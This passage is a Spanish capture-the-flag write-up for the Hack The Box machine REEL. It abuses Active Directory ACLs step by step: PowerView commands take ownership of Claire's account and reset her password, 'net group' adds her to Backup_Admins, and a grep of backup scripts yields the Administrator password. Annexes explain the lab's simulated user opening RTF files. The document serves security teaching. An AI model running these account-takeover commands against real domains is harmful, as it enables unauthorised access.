Una **ACL** es un conjunto de reglas que define quién (usuarios o grupos) tiene permisos y qué tipo de operaciones pueden realizar sobre un objeto determinado. Los objetos pueden ser cualquier componente del dominio en Active Directory, como una cuenta de usuario, un grupo, una unidad organizativa, entre otros.

Cada regla en una **ACL** se conoce como Entrada de Control de Acceso o **ACE** (Access Control Entry). Un **ACE** especifica el acceso otorgado o denegado a un solo usuario o grupo.

Dentro de una **ACL**, existen Listas de Control de Acceso Discrecionales o **DACLs**. Una **DACL** es un componente de una **ACL** que lista los usuarios y los grupos que tienen permisos para acceder a un objeto, así como los usuarios y los grupos a los que se les niega el acceso. A diferencia de la **ACL** en su totalidad, que puede ser vista por cualquier usuario, una **DACL** puede ser configurada y vista solo por el propietario del objeto o un administrador.

Con estos conceptos en mente, el análisis del archivo `acls.csv` toma relevancia. Este archivo, abierto con **libreoffice**, contiene **detalles sobre las ACLs y las DACLs** correspondientes en el dominio, incluyendo el objeto, el tipo, el GUID, el nombre principal, el tipo de principal, los derechos de Active Directory, el tipo de **ACE**, el tipo de control de acceso y si la **ACL** es heredada:

![imagen 2](Pasted image 20230802134045.png)

Al inspeccionar las **ACLs**, se encuentra una **posible vía de escalada de privilegios.** Se descubre que el usuario Tom tiene el privilegio `WriteOwner` sobre el usuario Claire:

![imagen 2](Pasted image 20230802134325.png)

El privilegio `WriteOwner` permite al usuario Tom modificar el propietario del objeto del usuario Claire. Esto significa que Tom tiene el permiso para reasignar la propiedad de la cuenta de Claire, lo que incluye **cambiar la contraseña de Claire** y obtener control total sobre la misma.

Además, se descubre que Claire tiene el privilegio `WriteDacl` sobre el grupo **Backup_Admins**:

![imagen 2](Pasted image 20230802134357.png)

`WriteDacl` permite a un usuario modificar la **DACL** de un objeto. En este contexto, **podría permitir a Claire agregarse a sí misma al grupo Backup_Admins**.

El grupo **Backup_Admins** parece ser significativo. Su asociación con operaciones de respaldo y administración sugiere que puede tener **privilegios especiales sobre el dominio**. Esta pista, junto con los privilegios recién descubiertos, indica una ruta de escalada de privilegios que vale la pena explorar.

#### Explotando el Privilegio WriteOwner: Cambiando la Contraseña de Claire

El proceso para explotar la ACL `WriteOwner` y c**ambiar la contraseña del usuario Claire** consta de varios pasos. Se llevará a cabo utilizando la herramienta PowerView.ps1, que ya se encuentra en el sistema en la ruta `C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1`.

En primer lugar, es necesario cambiar a la terminal de PowerShell. Esto se realiza con el simple comando `powershell`. 

Una vez en PowerShell, se importa el módulo PowerView.ps1:

```powershell
import-module .\PowerView.ps1
```

Ahora que se ha importado el módulo, se puede comenzar a explotar el privilegio `WriteOwner`. Para ello, se sigue la siguiente secuencia de comandos. 

En primer lugar, se configura a Tom como el propietario del objeto de dominio asociado a Claire. 

```powershell
Set-DomainObjectOwner -identity claire -OwnerIdentity tom
```

A continuación, se agrega a Tom a la lista de control de acceso (ACL) de Claire. Esto le otorgará a Tom el derecho de restablecer la contraseña de Claire.

```powershell
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
```

Luego, se genera una cadena segura que contiene la nueva contraseña para Claire. En este caso, se ha optado por la contraseña "fran123$!".

```powershell
$cred = ConvertTo-SecureString "fran123$!" -AsPlainText -force
```

Finalmente, se utiliza la cadena segura generada para cambiar la contraseña de Claire.

```powershell
Set-DomainUserPassword -identity claire -accountpassword $cred
```

Resultado de la ejecución de los comandos anteriores:

![imagen 2](Pasted image 20230802135721.png)

#### Acceso SSH como Claire

Una vez que la contraseña de Claire ha sido cambiada, es posible obtener una **shell como este usuario a través de SSH**. Esto se hace de la misma manera que se hizo con el usuario Tom, utilizando el comando `ssh claire@10.10.10.77`. Al ingresar la nueva contraseña cuando se solicite, se obtendrá acceso a la máquina como el usuario Claire:

![imagen 2](Pasted image 20230802174100.png)

### Explotando el Privilegio WriteDACL: Incorporando a Claire en Backup_Admins

Habiendo obtenido una **shell como Claire**, el paso sucesivo es incorporar a Claire en el grupo *Backup_Admins*. Recordemos que Claire tiene el privilegio `WriteDACL` sobre este grupo, lo que le permite alterar sus miembros. Para llevar a cabo esta acción, utilizamos el comando `net` de Windows, que proporciona una amplia gama de funciones para gestionar cuentas de usuario y grupos:

```powershell
net group Backup_Admins claire /add
```

Una vez ejecutado este comando, es posible confirmar que Claire ha sido agregada al grupo usando el comando `net user`:

![imagen 2](Pasted image 20230802131147.png)

Es recomendable **restablecer la conexión SSH** en este punto para asegurar que todos los cambios se apliquen de manera efectiva.

### Explorando Privilegios Adquiridos y Descubrimiento de Nuevas Oportunidades

Con Claire ahora como miembro del grupo *Backup_Admins*, nuestra atención se desvía hacia el examen del **directorio del usuario Administrator**, donde se descubre que **este grupo posee ciertos permisos privilegiados**. Los permisos de este directorio se detallan a continuación:

![imagen 2](Pasted image 20230802160920.png)

Al investigar los permisos del directorio del usuario Administrator, se aprecia que el grupo `Backup_Admins` posee "Acceso Total" (`F`, que representa "Full control") sobre este directorio, extendiéndose a sus subcarpetas y archivos debido a las opciones `OI` (Object Inherit) y `CI` (Container Inherit). Esto otorga a los miembros del grupo `Backup_Admins`, incluyendo a Claire, la capacidad de listar, leer, escribir y ejecutar archivos, así como de modificar los permisos y asumir la propiedad de los archivos en este directorio.

A pesar de que el grupo `Backup_Admins` tiene permisos sobre este directorio, ciertas restricciones de seguridad específicas aplicadas al archivo `root.txt` impiden que se pueda leer directamente. Estas restricciones, detalladas en el [Anexo II](#anexo-ii-análisis-de-los-permisos-del-archivo-roottxt), hacen que a pesar de ser miembro del grupo con permisos totales sobre el directorio, Claire no pueda visualizar la flag contenida en `root.txt`. Sin embargo, se descubre otra carpeta en el  directorio `Desktop` llamada "Backup Scripts", que no presenta las mismas restricciones de seguridad y, por ende, es accesible para el grupo `Backup_Admins`.

La carpeta "Backup Scripts" alberga varios archivos de interés, incluyendo scripts PowerShell (`*.ps1`), archivos comprimidos en formato ZIP (`*.zip`) y archivos de texto (`*.txt`). Estos archivos podrían contener información valiosa o funcionalidades que podrían ser explotadas para obtener más acceso o información en el sistema.

Para buscar alguna posible credencial en estos archivos, se utiliza el siguiente **comando PowerShell**:

```powershell
dir | select-string "password|pwd|Pass"
```

Este comando busca las cadenas "password", "pwd" y "Pass" en todos los archivos del directorio actual. Para ejecutar este comando es necesario estar en PowerShell, por lo que previamente se cambia a PowerShell con el comando `powershell`.

Al ejecutar el comando, aparecen las siguientes líneas:

![imagen 2](Pasted image 20230802160157.png)

Ambas líneas proceden del mismo archivo `BackupScript.ps1`. Parece que la contraseña del usuario admin, posiblemente del usuario Administrator, es `Cr4ckMeIfYouC4n!`.

### Acceso SSH como Administrator

Para confirmar la validez de la contraseña `Cr4ckMeIfYouC4n!` obtenida para el usuario Administrator, se procede a realizar un intento de autenticación por SSH.

```bash
r1pfr4n@parrot> ssh administrator@10.10.10.77
```

Las credenciales son correctas, ya que es posible autenticarse con éxito:

![imagen 2](admin_shell.png)

Con esto, se han obtenido los máximos privilegios en el dominio `htb.local` y ya se puede listar la **segunda flag**.

### root.txt

La segunda flag se encuentra en el directorio **Desktop** del usuario **Administrator**:

```powershell
type root.txt                                                     
01f1c3d9b5b9e5****eb9a7599389b7 
```

## Anexo I: Descripción del Proceso Automatizado para la Apertura de Archivos RTF

Este Anexo se centra en describir la configuración automatizada de la máquina REEL para abrir automáticamente los archivos RTF y DOC, simulando así la actividad de un usuario real. Este proceso se lleva a cabo mediante una serie de scripts alojados en el directorio `Documents` del usuario Nico, así como a través de la interacción con dos carpetas específicas: `Attachments` y `Processed`.

### Configuración del Directorio

El contenido del directorio `Documents` del usuario Nico es el siguiente:

![imagen 2](Pasted image 20230802164919.png)

Existen tres elementos principales que son necesarios para este proceso de automatización:

1. **Carpeta Attachments**: Es el directorio donde se colocan los archivos RTF o DOC que se desean abrir automáticamente. Todo archivo que se coloque en esta carpeta será procesado por los scripts de automatización.

2. **Carpeta Processed**: Actúa como un área de transición para los archivos .doc y .rtf. Una vez que estos archivos se detectan en el directorio `Attachments`, son movidos a `Processed`, donde se abren y procesan. Posteriormente, estos archivos son eliminados.

3. **Scripts**: Existen dos scripts principales, `auto-enter.ahk` y `open-attachments.bat`, que facilitan la automatización de la apertura y procesamiento de los archivos.

### Funcionamiento de los Scripts

El funcionamiento de estos scripts es crucial para la automatización del proceso. A continuación, se detalla cómo funcionan estos scripts:

1. **Script auto-enter.ahk**: Este es un script de AutoHotkey, una herramienta de scripting de código abierto para Windows que permite la automatización de las acciones del teclado y el ratón. Aquí está el contenido del script:

```powershell
#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
#Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

#Persistent
SetTimer, PressTheKey, 6000
Return

PressTheKey:
Send {Alt Down}{Tab}{Alt Up}
sleep 1000
Send {Space}
Return
```

El script está configurado para presionar una secuencia de teclas cada 6 segundos, lo que permite cambiar entre las ventanas abiertas (`Alt + Tab`) y luego interactuar con la ventana actualmente enfocada (`Space`).

2. **Script open-attachments.bat**: Este script de lote de Windows trabaja en conjunto con el script AutoHotkey para implementar el proceso de automatización completo. Aquí está el contenido del script:

```powershell
@echo off
:LOOP
echo Looking for attachments
cd C:\Users\nico\Documents\

DIR /B C:\Users\nico\Documents\Attachments\ | findstr /i doc > C:\Users\nico\Documents\files.txt
DIR /B C:\Users\nico\Documents\Attachments\ | findstr /i rtf >> C:\Users\nico\Documents\files.txt

FOR /F "tokens=*" %%i in (files.txt) DO echo Opening attachments && MOVE /y C:\Users\nico\Documents\Attachments\%%i C:\Users\nico\Documents\Processed\%%i
FOR /F "tokens=*" %%i in (files.txt) DO START C:\Users\nico\Documents\auto-enter.ahk && ping 127.0.0.1 -n 3 > nul && START C:\Users\nico\Documents\Processed\%%i && ping 127.0.0.1 -n 20 > nul && taskkill /F /IM wordpad.exe && taskkill /F /IM AutoHotkey.exe && ping 127.0.0.1 -n 3 > nul

DEL /F C:\Users\nico\Documents\files.txt && ping 127.0.0.1 -n 3 > nul
DEL /F C:\Users\nico\Documents\Processed\*.rtf
DEL /F C:\Users\nico\Documents\Processed\*.doc
DEL /F C:\Users\nico\Documents\Processed\*.docx

cls
GOTO :LOOP
:EXIT
```

El script busca archivos con las extensiones .doc y .rtf en el directorio `Attachments` y los mueve a un directorio `Processed`. A continuación, abre los archivos procesados, mientras el script AutoHotkey se ejecuta en paralelo para simular la interacción con los archivos. Después de una breve pausa, el script mata los procesos de WordPad y AutoHotkey y elimina los archivos procesados.

Este proceso automatizado tiene como **objetivo** activar una vulnerabilidad específica: **CVE-2017-0199**. Esta es una vulnerabilidad de ejecución remota de código presente en la manera en que Microsoft Office y **WordPad** analizan los documentos RTF.

### Verificación de la Ejecución del Script

Para verificar que el script `open-attachments.bat` se está ejecutando en el sistema, se puede utilizar el comando `Get-WmiObject` de PowerShell, que proporciona información sobre los procesos en ejecución en el sistema. A continuación, se muestra un ejemplo de cómo se puede utilizar para verificar la ejecución del script:

```powershell
Get-WmiObject Win32_Process -Filter "name = 'cmd.exe'" | Select-Object CommandLine
```

Si `open-attachments.bat` se está ejecutando, se verá su ruta en la salida de este comando. La salida del comando anterior es la siguiente:

![imagen 2](Pasted image 20230802180213.png)

En esta salida, el primer proceso de `cmd.exe` es el que ejecuta `open-attachments.bat`, lo que indica que el script se está ejecutando actualmente.

## Anexo II: Análisis de los Permisos del Archivo root.txt

En el transcurso de la resolución de la máquina, surgió una pregunta intrigante: ¿Por qué, a pesar de tener acceso total al directorio del usuario Administrator, el grupo `Backup_Admins` no pudo visualizar el contenido del archivo `root.txt`? Para responder a esta pregunta, se examinaron en detalle los permisos de seguridad asociados con el archivo `root.txt`.

Los permisos del archivo `root.txt` se pueden observar utilizando el comando `icacls`, que revela la siguiente configuración de permisos:

![imagen 2](Pasted image 20230802162219.png)

La estructura de estos permisos se desglosa de la siguiente manera:

1. **HTB\Backup_Admins:(DENY)(R):** Este permiso niega explícitamente el derecho de lectura (R) al grupo `Backup_Admins`. La negación de un permiso tiene prioridad sobre cualquier concesión del mismo permiso. Por lo tanto, aunque el grupo tenga acceso total al directorio en el que se encuentra el archivo, este permiso de denegación específico prevalece y evita que los miembros del grupo `Backup_Admins` lean el archivo.

2. **NT AUTHORITY\SYSTEM:(F):** El sistema tiene control total (F) sobre el archivo, permitiendo todas las operaciones posibles.

3. **BUILTIN\Administrators:(RX):** Los administradores tienen permisos de lectura y ejecución (RX) en el archivo, lo que les permite leer su contenido y ejecutarlo si fuera un archivo ejecutable.

4. **HTB\Administrator:(F):** El usuario Administrator tiene control total (F) sobre el archivo, lo que significa que puede realizar cualquier operación en él, incluyendo lectura, escritura, ejecución, cambio de propiedades, y más.

En resumen, la razón por la cual el usuario Claire, perteneciente al grupo `Backup_Admins`, no pudo visualizar la flag contenida en `root.txt` se debe a un permiso de denegación explícito aplicado a ese grupo en particular. Aunque Claire tenía permisos para acceder al directorio en el que se encontraba el archivo, la configuración de permisos en el archivo `root.txt` en sí mismo impidió que ella lo leyera.
